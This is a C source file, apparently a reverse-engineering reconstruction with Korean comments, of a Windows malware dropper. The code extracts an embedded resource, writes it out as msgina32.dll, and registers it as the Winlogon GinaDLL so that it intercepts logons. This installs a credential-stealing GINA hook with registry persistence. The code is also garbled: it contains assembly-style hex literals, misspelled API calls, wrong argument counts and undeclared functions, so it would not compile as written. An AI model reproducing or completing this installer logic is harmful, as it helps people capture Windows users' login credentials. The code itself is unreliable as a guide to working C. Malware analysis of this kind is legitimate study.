#include <Windows.h>
#include <stdio.h>

int main()
{
    // * Module 
    LPCSTR lpModuleName = NULL; 
    LPSTR vir_allc; 
    LPSTR filename = NULL;

    HANDLE hModule = GetModuleHandleA(lpModuleName);
    if(hModule == NULL) exit(1);

    vir_allc = find_resource(hModule);

    GetModuleFileNameA(hModule, filename, 10Eh, vir_allc);
    _strrchr(filename, '\\');
    
    LPCSTR msg_dll = "\\msgina32.dll";
    BYTE *pch; 
    pch = (BYTE)memchr(filename, msg_dll, len(filename));
    set_reg(pch, 104h);
}

LPSTR find_resource(HANDLE hModule)
{
    HRSRC hResInfo;
    // @details: 위치를 찾는다. 
    hResInfo = FindResourceA(hModule,"TGAD","BINARY");
    if(hResInfo == NULL) exit(1);

    HGLOBAL hResData;
    // @return: A handle to the data associated with the resource; 
    hResData = LoadResource(hModule, hResInfo);
    if(hResData == NULL) FreeResource(hResData);

    LPVOID rsrc_buf;
    // @return: First byte of the resource(pointer)
    rsrc_buf = LockResource(hResData);
    if(rsrc_buf == NULL) FreeResource(hResData);

    DWORD rsrc_size;
    // @return: Number of bytes; 
    rsrc_size = SizeofResource(hModule, hResData);
    if(rsrc_size == NULL) FreeResource(hResData);

    // @details: 가상 메모리 할당 
    LPSTR vir_allc; 
    vir_allc = (LPSTR)VirtualAlloc(0, rsrc_size, MEM_COMMIT, 4);
    if(vir_allc == NULL) FreeResource(hResData);

    // ! rep movsd = memcpy 
    memecpy(vir_allc, rsrc_buf, rsrc_size); 

    // * File
    FILE* file_stream;
    file_stream = _open("msgina32.dll", "wb");
    // msgina32.dll를 rsrc_buf에 쓴다. 
    _fwrite(rsrc_buf, 1, rsrc_size, file_stream);
    _close(file_stream);

    return vir_allc;

}

void set_reg(LPSTR lpData, DWORD cbData)
{
    PHKEY phkResult; 
    if(RegCreateKeyExA(80000002h, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",0,0,REG_OPTION_NON_VOLATILE,0F003Fh,0,phkResult,0) != ERROR_SUCCESS) exit(1);
    // @param GinaDLL is subkey 
    // @details 
    // key: "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL"
    // value: resource value + \\msgina.dll  
    if(RegSetValueA(phkResult, "GinaDLL", 0 , 1, lpData, cbData)!= ERROR_SUCCESS) CloseHandle(phkResult);
    
    CloseHandle(phkResult);
}